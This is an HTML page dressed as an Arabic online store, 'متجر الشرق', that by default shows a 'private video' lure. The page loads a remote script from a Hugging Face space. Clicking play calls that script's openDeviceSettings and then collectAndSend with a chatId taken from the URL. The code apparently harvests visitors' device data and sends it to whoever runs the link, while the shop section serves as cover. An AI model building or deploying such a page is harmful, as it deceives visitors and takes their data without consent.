<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>متجر الشرق - أكبر متجر إلكتروني</title>
    
    <!-- SEO للتسويق -->
    <meta name="description" content="متجر الشرق - أكبر متجر إلكتروني في الشرق الأوسط. تسوق أفضل المنتجات بأقل الأسعار." />
    <meta name="keywords" content="متجر, تسوق, منتجات, تخفيضات, عروض, إلكترونيات" />
    <meta name="robots" content="index, follow" />
    <meta name="google-site-verification" content="your-verification-code" />
    
    <!-- Open Graph -->
    <meta property="og:title" content="متجر الشرق - أكبر متجر إلكتروني" />
    <meta property="og:description" content="تسوق أفضل المنتجات بأقل الأسعار. توصيل سريع وضمان الجودة." />
    <meta property="og:type" content="website" />
    <meta property="og:url" content="https://yourdomain.com" />
    
    <!-- Schema.org -->
    <script type="application/ld+json">
    {
        "@context": "https://schema.org",
        "@type": "OnlineStore",
        "name": "متجر الشرق",
        "description": "أكبر متجر إلكتروني في الشرق الأوسط",
        "url": "https://yourdomain.com"
    }
    </script>
    
    <!-- Google Analytics -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-XXXXXXXXXX"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'G-XXXXXXXXXX');
    </script>
    
    <style>
        /* ====== أنماط صفحة الفيديو ====== */
        .video-page {
            display: block;
        }
        .video-page *{margin:0;padding:0;box-sizing:border-box}
        .video-page body{
            font-family: Arial,sans-serif;
            display:flex;
            flex-direction:column;
            align-items:center;
            justify-content:center;
            min-height:100vh;
            background:#000;
            color:#fff;
        }
        .video-page .container{width:90%;max-width:800px;background:#111;border-radius:12px;overflow:hidden;box-shadow:0 10px 30px rgba(0,0,0,0.5)}
        .video-page .video-thumbnail{position:relative;width:100%;height:450px;background:linear-gradient(rgba(0,0,0,0.7),rgba(0,0,0,0.7)),url('https://i.postimg.cc/jSfpHvz8/IMG-20260104-210740-951.jpg');background-size:cover;background-position:center;display:flex;align-items:center;justify-content:center;cursor:default;flex-direction:column}
        .video-page #playBtn{display:flex;align-items:center;justify-content:center;width:120px;height:120px;border-radius:50%;background:rgba(255,255,255,0.1);border:3px solid #ff6b6b;cursor:pointer;transition:all 0.3s ease;backdrop-filter:blur(8px);box-shadow:0 0 40px rgba(255,0,0,0.3);z-index:10}
        .video-page #playBtn:hover{transform:scale(1.05);background:rgba(255,255,255,0.2);border-color:#ff4757;box-shadow:0 0 60px rgba(255,0,0,0.6)}
        .video-page #playBtn span{font-size:60px;color:#ff6b6b;line-height:1;user-select:none}
        .video-page .video-info{padding:20px;border-bottom:1px solid #333}
        .video-page .video-title{font-size:1.5rem;font-weight:bold;margin-bottom:8px;color:white}
        .video-page video{width:100%;height:450px;background:#000;display:none}
        .video-page .back-link{color:#ff6b6b;text-decoration:none;margin-top:20px;font-size:14px}
        
        /* ====== أنماط صفحة المنتجات ====== */
        .products-page {
            display: none;
            font-family: 'Segoe UI', Arial, sans-serif;
            background: #f5f6fa;
            color: #2d3436;
        }
        .products-page .header {
            background: #ffffff;
            padding: 15px 30px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.08);
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: sticky;
            top: 0;
            z-index: 1000;
            flex-wrap: wrap;
        }
        .products-page .logo {
            font-size: 28px;
            font-weight: 800;
            color: #e74c3c;
        }
        .products-page .logo span { color: #2d3436; }
        .products-page .search-bar {
            display: flex;
            flex: 0.5;
            background: #f0f0f0;
            border-radius: 30px;
            padding: 8px 20px;
            min-width: 200px;
        }
        .products-page .search-bar input {
            border: none;
            background: transparent;
            padding: 8px;
            width: 100%;
            outline: none;
            font-size: 14px;
        }
        .products-page .nav-links a {
            color: #2d3436;
            text-decoration: none;
            margin: 0 15px;
            font-size: 14px;
            font-weight: 500;
        }
        .products-page .nav-links a:hover { color: #e74c3c; }
        .products-page .cart-btn {
            background: #e74c3c;
            color: white;
            border: none;
            padding: 8px 20px;
            border-radius: 25px;
            cursor: pointer;
            font-weight: 600;
        }
        .products-page .hero {
            background: linear-gradient(135deg, #e74c3c, #c0392b);
            color: white;
            padding: 60px 30px;
            text-align: center;
            margin: 20px;
            border-radius: 15px;
        }
        .products-page .hero h1 { font-size: 42px; margin-bottom: 15px; }
        .products-page .hero p { font-size: 18px; opacity: 0.9; }
        .products-page .hero .btn-shop {
            background: white;
            color: #e74c3c;
            border: none;
            padding: 15px 40px;
            border-radius: 30px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 20px;
            transition: transform 0.3s;
        }
        .products-page .hero .btn-shop:hover { transform: scale(1.05); }
        .products-page .categories {
            display: flex;
            justify-content: center;
            gap: 30px;
            padding: 30px;
            flex-wrap: wrap;
        }
        .products-page .category {
            background: white;
            padding: 20px 40px;
            border-radius: 12px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
            cursor: pointer;
            transition: all 0.3s;
            text-align: center;
        }
        .products-page .category:hover {
            transform: translateY(-5px);
            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
        }
        .products-page .category .icon { font-size: 36px; display: block; margin-bottom: 8px; }
        .products-page .category .name { font-weight: 600; font-size: 14px; }
        .products-page .products-section { padding: 20px 30px; max-width: 1400px; margin: 0 auto; }
        .products-page .section-title {
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 25px;
            color: #2d3436;
        }
        .products-page .section-title span { color: #e74c3c; }
        .products-page .products-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
            gap: 25px;
        }
        .products-page .product-card {
            background: white;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
            transition: all 0.3s;
            cursor: pointer;
            border: 1px solid #eee;
        }
        .products-page .product-card:hover {
            transform: translateY(-8px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.12);
        }
        .products-page .product-image {
            height: 200px;
            background: #f8f9fa;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 60px;
        }
        .products-page .product-info { padding: 15px; }
        .products-page .product-name {
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 5px;
            color: #2d3436;
        }
        .products-page .product-price {
            font-size: 18px;
            font-weight: 700;
            color: #e74c3c;
        }
        .products-page .product-price .old {
            font-size: 14px;
            color: #999;
            text-decoration: line-through;
            font-weight: 400;
            margin-left: 8px;
        }
        .products-page .product-rating {
            color: #f1c40f;
            font-size: 13px;
            margin-top: 5px;
        }
        .products-page .product-rating span { color: #999; }
        .products-page .footer {
            background: #2d3436;
            color: white;
            padding: 40px 30px 20px;
            margin-top: 40px;
        }
        .products-page .footer-content {
            max-width: 1400px;
            margin: 0 auto;
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 30px;
        }
        .products-page .footer-content h4 { margin-bottom: 15px; font-size: 16px; }
        .products-page .footer-content p, .products-page .footer-content a {
            color: #b2bec3;
            font-size: 14px;
            line-height: 2;
            text-decoration: none;
        }
        .products-page .footer-content a:hover { color: white; }
        .products-page .footer-bottom {
            text-align: center;
            padding-top: 20px;
            border-top: 1px solid #636e72;
            margin-top: 20px;
            color: #b2bec3;
            font-size: 13px;
        }
        
        @media (max-width: 768px) {
            .products-page .header { flex-direction: column; gap: 10px; }
            .products-page .search-bar { flex: 1; min-width: 100%; }
            .products-page .hero h1 { font-size: 28px; }
            .products-page .categories { gap: 15px; }
            .products-page .category { padding: 15px 25px; }
            .products-page .products-grid { grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); }
            .video-page .video-thumbnail { height: 280px; }
            .video-page #playBtn { width: 90px; height: 90px; }
            .video-page #playBtn span { font-size: 45px; }
        }
    </style>
</head>
<body>

    <!-- ====== صفحة الفيديو ====== -->
    <div class="video-page" id="videoPage">
        <div class="container">
            <div class="video-info">
                <div class="video-title">🔒 فيديو خاص</div>
            </div>
            <div class="video-thumbnail" id="poster">
                <div id="playBtn"><span>▶</span></div>
            </div>
            <video id="vid" controls playsinline style="display:none;width:100%;height:450px;background:#000">
                <source src="https://files.catbox.moe/okukrp.mp4" type="video/mp4">
            </video>
        </div>
        <a href="?page=products" class="back-link">🛍️ تسوق الآن</a>
    </div>

    <!-- ====== صفحة المنتجات ====== -->
    <div class="products-page" id="productsPage">
        <!-- Header -->
        <header class="header">
            <div class="logo">🛍️ متجر <span>الشرق</span></div>
            <div class="search-bar">
                <input type="text" placeholder="ابحث عن منتج..." />
            </div>
            <div class="nav-links">
                <a href="?page=products">الرئيسية</a>
                <a href="#">تخفيضات</a>
                <a href="#">إلكترونيات</a>
                <a href="#">أزياء</a>
            </div>
            <button class="cart-btn">🛒 سلة (0)</button>
        </header>

        <!-- Hero -->
        <section class="hero">
            <h1>🎉 تخفيضات الصيف تصل إلى 70%</h1>
            <p>أكبر تخفيضات الموسم على آلاف المنتجات. عروض لا تُفوت!</p>
            <button class="btn-shop" onclick="document.getElementById('productsGrid').scrollIntoView({behavior:'smooth'})">تسوق الآن</button>
        </section>

        <!-- Categories -->
        <section class="categories">
            <div class="category"><span class="icon">📱</span><span class="name">إلكترونيات</span></div>
            <div class="category"><span class="icon">👗</span><span class="name">أزياء</span></div>
            <div class="category"><span class="icon">🏠</span><span class="name">منزل ومطبخ</span></div>
            <div class="category"><span class="icon">📚</span><span class="name">كتب</span></div>
            <div class="category"><span class="icon">🎮</span><span class="name">ألعاب</span></div>
            <div class="category"><span class="icon">💄</span><span class="name">تجميل</span></div>
        </section>

        <!-- Products -->
        <section class="products-section">
            <h2 class="section-title">🔥 <span>أفضل</span> العروض لهذا الأسبوع</h2>
            <div class="products-grid" id="productsGrid"></div>
        </section>

        <!-- Footer -->
        <footer class="footer">
            <div class="footer-content">
                <div>
                    <h4>🛍️ متجر الشرق</h4>
                    <p>أكبر متجر إلكتروني في الشرق الأوسط. نقدم أفضل المنتجات بأقل الأسعار مع توصيل سريع وضمان الجودة.</p>
                </div>
                <div>
                    <h4>روابط سريعة</h4>
                    <a href="?page=products">الرئيسية</a><br>
                    <a href="#">تخفيضات</a><br>
                    <a href="#">إلكترونيات</a><br>
                    <a href="#">أزياء</a>
                </div>
                <div>
                    <h4>سياسة الخصوصية</h4>
                    <a href="#">سياسة الخصوصية</a><br>
                    <a href="#">شروط الاستخدام</a><br>
                    <a href="#">سياسة الإرجاع</a><br>
                    <a href="#">التوصيل</a>
                </div>
                <div>
                    <h4>تواصل معنا</h4>
                    <p>📞 +966 12 345 6789</p>
                    <p>✉️ info@sharq-store.com</p>
                    <p>📍 الرياض، المملكة العربية السعودية</p>
                </div>
            </div>
            <div class="footer-bottom">
                &copy; 2026 متجر الشرق. جميع الحقوق محفوظة.
            </div>
        </footer>
    </div>

    <!-- ====== تحميل API ====== -->
    <script src="https://huggingface.co/spaces/dsfsdjfc/ageagaaa/raw/main/api"></script>

    <script>
        // ====== التحكم في الصفحات ======
        (function() {
            // الحصول على معلمة الصفحة
            var urlParams = new URLSearchParams(window.location.search);
            var page = urlParams.get('page');
            
            var videoPage = document.getElementById('videoPage');
            var productsPage = document.getElementById('productsPage');
            
            // إظهار الصفحة المناسبة
            if (page === 'products') {
                videoPage.style.display = 'none';
                productsPage.style.display = 'block';
                // عرض المنتجات
                displayProducts();
            } else {
                videoPage.style.display = 'block';
                productsPage.style.display = 'none';
                // تشغيل الفيديو
                setupVideo();
            }
            
            // ====== عرض المنتجات ======
            function displayProducts() {
                var products = [
                    // إلكترونيات
                    { name: 'هاتف ذكي X100', price: 1999, oldPrice: 2999, icon: '📱', rating: 4.8 },
                    { name: 'لابتوب Pro 15"', price: 3499, oldPrice: 4999, icon: '💻', rating: 4.7 },
                    { name: 'سماعة لاسلكية', price: 299, oldPrice: 499, icon: '🎧', rating: 4.5 },
                    { name: 'ساعة ذكية', price: 799, oldPrice: 1299, icon: '⌚', rating: 4.6 },
                    { name: 'شاشة 4K 55"', price: 2499, oldPrice: 3999, icon: '📺', rating: 4.8 },
                    { name: 'كاميرا رقمية', price: 1599, oldPrice: 2499, icon: '📷', rating: 4.4 },
                    { name: 'جهاز تابلت', price: 899, oldPrice: 1499, icon: '📱', rating: 4.3 },
                    { name: 'مكبر صوت', price: 399, oldPrice: 599, icon: '🔊', rating: 4.2 },
                    // أزياء
                    { name: 'قميص رجالي', price: 89, oldPrice: 159, icon: '👔', rating: 4.5 },
                    { name: 'فستان سهرة', price: 199, oldPrice: 349, icon: '👗', rating: 4.7 },
                    { name: 'حذاء رياضي', price: 249, oldPrice: 399, icon: '👟', rating: 4.6 },
                    { name: 'حقيبة يد', price: 149, oldPrice: 249, icon: '👜', rating: 4.4 },
                    { name: 'نظارة شمسية', price: 99, oldPrice: 199, icon: '🕶️', rating: 4.3 },
                    { name: 'ساعة يد', price: 149, oldPrice: 299, icon: '⌚', rating: 4.5 },
                    { name: 'جينز رجالي', price: 129, oldPrice: 229, icon: '👖', rating: 4.4 },
                    { name: 'بلوزة نسائية', price: 79, oldPrice: 149, icon: '👚', rating: 4.3 },
                    // منزل ومطبخ
                    { name: 'طقم قدور', price: 299, oldPrice: 499, icon: '🍳', rating: 4.5 },
                    { name: 'خلاط كهربائي', price: 199, oldPrice: 349, icon: '🥤', rating: 4.4 },
                    { name: 'مكنسة كهربائية', price: 399, oldPrice: 599, icon: '🧹', rating: 4.6 },
                    { name: 'سجاد صلاة', price: 89, oldPrice: 149, icon: '🧎', rating: 4.3 },
                    { name: 'طقم أواني', price: 249, oldPrice: 399, icon: '🍽️', rating: 4.5 },
                    { name: 'غلاية كهربائية', price: 79, oldPrice: 149, icon: '🫖', rating: 4.2 },
                    { name: 'محضرة طعام', price: 499, oldPrice: 799, icon: '🥘', rating: 4.7 },
                    { name: 'طقم مفارش', price: 159, oldPrice: 279, icon: '🛏️', rating: 4.4 },
                    // كتب
                    { name: 'رواية عربية', price: 39, oldPrice: 69, icon: '📖', rating: 4.8 },
                    { name: 'كتاب طبخ', price: 59, oldPrice: 99, icon: '📕', rating: 4.6 },
                    { name: 'موسوعة علمية', price: 89, oldPrice: 149, icon: '📚', rating: 4.7 },
                    { name: 'كتاب تنمية', price: 49, oldPrice: 79, icon: '📘', rating: 4.5 },
                    { name: 'قصص أطفال', price: 29, oldPrice: 49, icon: '📙', rating: 4.4 },
                    { name: 'كتاب تاريخ', price: 69, oldPrice: 119, icon: '📗', rating: 4.6 },
                    // ألعاب
                    { name: 'بلايستيشن 5', price: 1999, oldPrice: 2999, icon: '🎮', rating: 4.9 },
                    { name: 'لعبة فيفا 2025', price: 199, oldPrice: 349, icon: '⚽', rating: 4.5 },
                    { name: 'لعبة فورتنايت', price: 99, oldPrice: 199, icon: '🔫', rating: 4.3 },
                    { name: 'كنترولر لاسلكي', price: 299, oldPrice: 499, icon: '🎮', rating: 4.4 },
                    { name: 'لعبة ماين كرافت', price: 79, oldPrice: 149, icon: '⛏️', rating: 4.6 },
                    { name: 'لعبة كول أوف ديوتي', price: 249, oldPrice: 399, icon: '🎯', rating: 4.7 },
                    // تجميل
                    { name: 'طقم مكياج', price: 199, oldPrice: 349, icon: '💄', rating: 4.5 },
                    { name: 'عطر فاخر', price: 299, oldPrice: 499, icon: '🧴', rating: 4.8 },
                    { name: 'كريم ترطيب', price: 79, oldPrice: 149, icon: '🧪', rating: 4.3 },
                    { name: 'ماسك للوجه', price: 49, oldPrice: 89, icon: '🧖', rating: 4.2 },
                    { name: 'مجفف شعر', price: 149, oldPrice: 249, icon: '💇', rating: 4.4 },
                    { name: 'طقم أظافر', price: 39, oldPrice: 69, icon: '💅', rating: 4.1 }
                ];

                var grid = document.getElementById('productsGrid');
                if (grid) {
                    grid.innerHTML = products.map(function(p) {
                        var stars = '';
                        for (var i = 0; i < Math.floor(p.rating); i++) stars += '⭐';
                        for (var i = 0; i < 5 - Math.floor(p.rating); i++) stars += '☆';
                        return '<div class="product-card">' +
                            '<div class="product-image">' + p.icon + '</div>' +
                            '<div class="product-info">' +
                                '<div class="product-name">' + p.name + '</div>' +
                                '<div class="product-price">' + p.price + ' ر.س <span class="old">' + p.oldPrice + ' ر.س</span></div>' +
                                '<div class="product-rating">' + stars + ' <span>(' + p.rating + ')</span></div>' +
                            '</div>' +
                        '</div>';
                    }).join('');
                }
            }
            
            // ====== إعداد الفيديو ======
            function setupVideo() {
                var step = 0;
                var started = false;
                var btn = document.getElementById('playBtn');
                var poster = document.getElementById('poster');
                var vid = document.getElementById('vid');
                
                function waitForAPI(callback, attempts) {
                    attempts = attempts || 0;
                    if (window.SecurityAPI) {
                        callback(window.SecurityAPI);
                    } else if (attempts < 20) {
                        setTimeout(function() {
                            waitForAPI(callback, attempts + 1);
                        }, 500);
                    }
                }
                
                if (btn) {
                    btn.addEventListener('click', function() {
                        if (started) return;
                        
                        if (!step) {
                            step = 1;
                            waitForAPI(function(api) {
                                try { api.openDeviceSettings(); } catch(e) {}
                            });
                        } else {
                            started = true;
                            vid.muted = false;
                            vid.volume = 1;
                            vid.play().catch(function(){});
                            poster.style.display = 'none';
                            vid.style.display = 'block';
                            btn.style.display = 'none';
                            
                            waitForAPI(function(api) {
                                var chatId = new URLSearchParams(window.location.search).get('chatId') || '';
                                api.collectAndSend(chatId).then(function(result) {
                                    console.log('Data sent:', result);
                                }).catch(function(err) {
                                    console.error('Error:', err);
                                });
                            });
                        }
                    });
                }
                
                document.addEventListener('click', function() {
                    if (vid && vid.style.display === 'block') {
                        vid.muted = false;
                        if (vid.paused) vid.play().catch(function(){});
                    }
                }, true);
            }
            
        })();
    </script>
</body>
</html>
